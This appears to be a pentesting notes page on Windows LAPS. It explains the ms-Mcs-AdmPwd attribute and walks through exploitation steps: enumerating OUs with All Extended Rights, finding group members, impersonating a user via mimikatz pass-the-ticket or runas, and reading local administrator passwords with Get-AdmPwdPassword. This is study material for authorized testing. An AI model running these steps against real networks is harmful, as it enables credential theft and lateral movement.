# Local Administrator Password Solution (LAPS)

### Resources

#### (1) Learning resources

1. **ms-Mcs-AdmPwd attribute**

{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/ad2ce8fa-42a0-4371-ad18-5d1d1c488b22" %}

2. **What is Windows LAPS?**

{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview" %}

3. **Windows LAPS PowerShell cmdlets**

{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-powershell" %}

4. **Additional resources**

{% embed url="https://adsecurity.org/?p=3164" %}

#### (2) Exploitation examples

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/laps" %}

{% embed url="https://github.com/passtheticket/Abusing_Laps_Toolkit" %}

PDF: [https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf?utm\_source=dlvr.it\&utm\_medium=twitter](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf?utm_source=dlvr.it\&utm_medium=twitter)

### Basic concepts

What is the `ms-Mcs-AdmPwd` attribute?

An attribute used by the LAPS feature, that contains a cleartext password (this will usually be the password of the local administrator account).

What is the `admpwd.dll` file?

{% embed url="https://adsecurity.org/?p=3164" %}

The presence of this file will indicate that the **Group Policy Client Side Extension** (**CSE**) is configured on the computer, and that the LAPS client is installed on the machine. It is located in `C:\program files\LAPS\CSE`.

### AllExtendedRights

#### 1. What is the "All extended rights" attribute given to an AD organizational unit (OU) under the context of LAPS?

For a given OU with this attribute set, any extended right holders (groups, users, etc.) will be able to read the LAPS password for any machines under that particular OU. Since the LAPS password mostly involves the local administrator account, this means that the rights holder will be able to retrieve the password for the local administrator (stored in the `ms-Mcs-AdmPwd` attribute).

#### Exploitation steps

1. Query all the OUs that has the "**All extended rights**" attribute that deals with LAPS

{% embed url="https://learn.microsoft.com/en-us/powershell/module/laps/find-lapsadextendedrights?view=windowsserver2025-ps" %}

{% code overflow="wrap" %}
```powershell
PS> Find-LapsADExtendedRights -Identity *
Name                 DistinguishedName                    Status
----                  -----------------                   ------
Domain Controllers  OU=Domain Controllers,DC=xxxx         Delegated
<OU>                OU=<OU>,DC=xxxx                       Delegated
```
{% endcode %}

2. Retrieve the extended right holders for a particular OU

```powershell
PS> Find-LapsADExtendedRights -Identity <OU>
ObjectDN         ExtendedRightHolders
--------         -------------------
OU=<OU>,DC=xxxx  {xxxx\xxxx}
```

3. Retrieve the users in the group

Given that a particular group has extended rights, we can enumerate the users of that particular group:

```powershell
PS> net groups <GROUPNAME>
PS> Get-ADGroupMembers -Identity <GROUPNAME>
```

4. Retrieve the LAPS password

Given that we have compromised or impersonate a particular user of that group (found in the previous step), we can retrieve the LAPS password of a particular machine under the OU. This will provide us with the local administrator password for that machine.

First, we have to load the credentials for the user to impersonate using either a TGT (pass-the-ticket) or simply a username and password combination with the `runas.exe` utility:  &#x20;

```powershell
mimikatz # kerberos::ptt ...
PS> runas.exe /netonly ...
```

Next, we can retrieve the password for the local administrator account on the machine given by `<TARGET_COMPUTER>`:

```powershell
PS> Get-AdmPwdPassword -ComputerName <TARGET_COMPUTER>
```
